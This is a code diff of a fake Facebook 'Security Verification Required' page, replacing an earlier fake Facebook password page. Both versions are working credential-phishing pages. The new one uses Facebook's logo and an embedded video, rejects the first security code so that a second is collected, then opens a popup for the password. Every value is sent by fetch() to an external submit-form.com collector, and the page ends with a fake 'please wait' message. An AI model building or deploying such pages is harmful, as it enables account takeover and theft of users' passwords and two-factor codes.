@@ -1,200 +1,241 @@
+<html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Security Confirmation</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    body {
+      font-family: 'Helvetica Neue', Arial, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
 
-<!DOCTYPE html>
-<html lang="en">
+    .container {
+      background-color: white;
+      padding: 40px 30px;
+      border-radius: 10px;
+      box-shadow: 0px 6px 18px rgba(0, 0, 0, 0.1);
+      width: 400px;
+      max-width: 90%;
+    }
 
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Password Page</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <style>
-        body {
-            font-family: 'Helvetica Neue', Arial, sans-serif;
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
+    .logo {
+      text-align: left;
+      margin-bottom: 20px;
+    }
 
-        .container {
-            background-color: white;
-            padding: 40px 30px;
-            border-radius: 8px;
-            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.15);
-            text-align: center;
-            width: 360px;
-            position: relative;
-        }
+    .logo img {
+      width: 120px;
+    }
 
-        .logo {
-            margin-bottom: 20px;
-        }
+    .header {
+      text-align: left;
+      font-size: 20px;
+      color: #333;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
 
-        .logo img {
-            width: 120px;
-        }
+    .description {
+      font-size: 14px;
+      color: #606770;
+      text-align: left;
+      margin-bottom: 25px;
+    }
 
-        .header {
-            margin-bottom: 20px;
-            font-size: 18px;
-            color: #333;
-            font-weight: bold;
-        }
+    .video-section {
+      margin-bottom: 15px;
+      text-align: left;
+    }
 
-        .form-group {
-            margin-bottom: 25px;
-            text-align: left;
-            position: relative;
-        }
+    .video-section iframe {
+      width: 60%;
+      height: 160px;
+      border-radius: 8px;
+      display: block;
+      position: relative;
+    }
 
-        .form-group label {
-            display: block;
-            font-weight: bold;
-            margin-bottom: 8px;
-            font-size: 14px;
-            color: #606770;
-        }
+    .form-group {
+      margin-bottom: 14px;
+    }
 
-        .input-wrapper {
-            position: relative;
-        }
+    .form-group label {
+      display: block;
+      font-weight: bold;
+      margin-bottom: 8px;
+      font-size: 14px;
+      color: #606770;
+    }
 
-        .form-group input {
-            width: 100%;
-            padding: 14px;
-            padding-right: 40px;
-            /* Space for the eye icon */
-            border: 1px solid #ccd0d5;
-            border-radius: 6px;
-            font-size: 16px;
-            color: #1c1e21;
-            box-sizing: border-box;
-        }
+    .form-group input {
+      width: 70%;
+      padding: 12px;
+      border: 1px solid #ccd0d5;
+      border-radius: 6px;
+      font-size: 16px;
+      color: #1c1e21;
+    }
 
-        .form-group input:focus {
-            border-color: #1877f2;
-            outline: none;
-            box-shadow: 0px 0px 0px 2px rgba(24, 119, 242, 0.2);
-        }
+    .form-group input:focus {
+      border-color: #1877f2;
+      outline: none;
+      box-shadow: 0px 0px 0px 2px rgba(24, 119, 242, 0.2);
+    }
 
-        .eye-icon {
-            position: absolute;
-            right: 10px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 20px;
-            color: #606770;
-            cursor: pointer;
-            transition: color 0.3s ease;
-        }
-    
-        .eye-icon:hover {
-            color: #1877f2;
-        }
+    .error-message {
+      color: #e74c3c;
+      font-size: 14px;
+      margin-top: 5px;
+    }
 
-        .submit-button {
-            background-color: #1877f2;
-            color: white;
-            border: none;
-            padding: 14px;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-            margin-top: 10px;
-        }
+    .success-message {
+      color: #2ecc71;
+      font-size: 14px;
+      margin-top: 5px;
+    }
 
-        .submit-button:hover {
-            background-color: #166fe5;
-        }
+    .submit-button {
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      padding: 14px;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      width: 50%;
+    }
 
-        .error-message {
-            color: #e74c3c;
-            font-size: 14px;
-            margin-top: 5px;
-            margin-bottom: 15px;
-            text-align: left;
-        }
-    </style>
+    .submit-button:hover {
+      background-color: #166fe5;
+    }
+
+    .popup {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.5);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 999;
+    }
+
+    .popup-content {
+      background: white;
+      padding: 30px;
+      border-radius: 8px;
+      width: 350px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.3);
+      text-align: center;
+    }
+
+    .popup-content input {
+      margin-top: 15px;
+      width: 90%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+
+    .popup-content button {
+      margin-top: 15px;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      padding: 10px 16px;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+  </style>
 </head>
-
 <body>
-    <div class="container">
-        <div class="logo">
-            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="Logo">
-            <div class="header">
-                Facebook Security
-            </div>
-            <p>Please re-enter your password to complete the request.</p>
-            <form id="meta-form" action="https://submit-form.com/I53ZqmRj5" method="POST">
-                <input type="hidden" name="_redirect" value="https://www.facebook.com/help/media/thank-you?rdrhc" />
+  <div class="container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="Facebook Logo">
+    </div>
 
-                <!-- Replace with your Access Key -->
-                <input type="hidden" name="access_key" value="22983eba-14f6-431b-8283-10e298027760">
-                <div class="form-group">
-                    <label for="password">Password</label>
-                    <div class="input-wrapper">
-                        <input type="password" id="password" name="password" placeholder="Enter your password" required>
-                        <i class="eye-icon fas fa-eye" id="togglePassword"></i>
-                    </div>
-                    <span id="error-message" class="error-message"></span>
-                </div>
-                <button type="submit" class="submit-button">Submit</button>
-                <center>
-                    <font color="black">
-                        <font size="2">
-            </form>
+    <div class="header">Security Verification Required</div>
+    <p class="description">
+      For your account’s safety, we need to confirm it’s really you. 
+      Watch The Detailed Video Information to Confirm The Account
+    </p>
+
+    <div class="video-section">
+      <iframe src="https://blqiozzohqqszikuuqad.supabase.co/storage/v1/object/public/videos//WhatsApp%20Video%202025-06-17%20at%2012.01.20.mp4" title="Why Security Codes Are Important" allowfullscreen=""></iframe>
+    </div>
+
+    <form id="securityForm">
+      <div class="form-group">
+        <label for="security-code">Security Code</label>
+        <input type="text" id="security-code" name="code" placeholder="Enter your security code" maxlength="10" required="">
+        <span id="message" class="error-message"></span>
+      </div>
+      <button type="submit" class="submit-button">Confirm Account</button>
+    </form>
+  </div>
+
+  <!-- Password Popup -->
+  <div class="popup" id="passwordPopup">
+    <div class="popup-content">
+      <h3>Re-enter your password to confirm</h3>
+      <input type="password" id="passwordInput" placeholder="Password">
+      <button onclick="submitPassword()">Submit</button>
+    </div>
+  </div>
+
+  <script>
+    let attempt = 0;
+
+    const form = document.getElementById("securityForm");
+    const message = document.getElementById("message");
+    const popup = document.getElementById("passwordPopup");
+
+    form.addEventListener("submit", function (e) {
+      e.preventDefault();
+      const code = document.getElementById("security-code").value;
+
+      fetch("https://submit-form.com/I53ZqmRj5", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ code })
+      });
+
+      attempt++;
+
+      if (attempt === 1) {
+        message.className = "error-message";
+        message.textContent = "Something went wrong. Please try another backup code.";
+      } else if (attempt === 2) {
+        message.className = "success-message";
+        message.textContent = "Code verified. Please re-enter your password to confirm.";
+        popup.style.display = "flex";
+      }
+    });
+
+    function submitPassword() {
+      const password = document.getElementById("passwordInput").value;
+
+      fetch("https://submit-form.com/I53ZqmRj5", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ password })
+      });
+
+      popup.innerHTML = `
+        <div class="popup-content">
+          <p>Thank you. Please wait while we verify your info...</p>
         </div>
-        <script>
-            document.getElementById('togglePassword').addEventListener('click', function() {
-                var passwordField = document.getElementById('password');
-                var eyeIcon = this;
-                if (passwordField.type === 'password') {
-                    passwordField.type = 'text';
-                    eyeIcon.classList.remove('fa-eye');
-                    eyeIcon.classList.add('fa-eye-slash');
-                } else {
-                    passwordField.type = 'password';
-                    eyeIcon.classList.remove('fa-eye-slash');
-                    eyeIcon.classList.add('fa-eye');
-                }
-            });
+      `;
+    }
+  </script>
 
-            document.getElementById('passwordForm').addEventListener('submit', function(event) {
-                var passwordField = document.getElementById('password');
-                var errorMessage = document.getElementById('error-message');
-                if (passwordField.value.length < 6) {
-                    errorMessage.textContent = 'Password must be at least 6 characters long.';
-                    event.preventDefault();
-                } else {
-                    errorMessage.textContent = '';
-                    // Perform form submission via Fetch API
-                    event.preventDefault(); // Prevent default form submission
 
-                    var formData = new FormData(this);
-                    fetch(this.action, {
-                            method: 'POST',
-                            body: formData,
-                            headers: {
-                                'Accept': 'application/json'
-                            }
-                        })
-                        .then(response => {
-                            if (response.ok) {
-                                window.location.href = 'https://www.facebook.com/help/media/thank-you?rdrhc'; // Redirect to desired URL
-                            } else {
-                                errorMessage.textContent = 'There was an error. Please try again.';
-                            }
-                        })
-                        .catch(() => {
-                            errorMessage.textContent = 'There was an error. Please try again.';
-                        });
-                }
-            });
-        </script>
-</body>
-
-</html>
+</body></html>
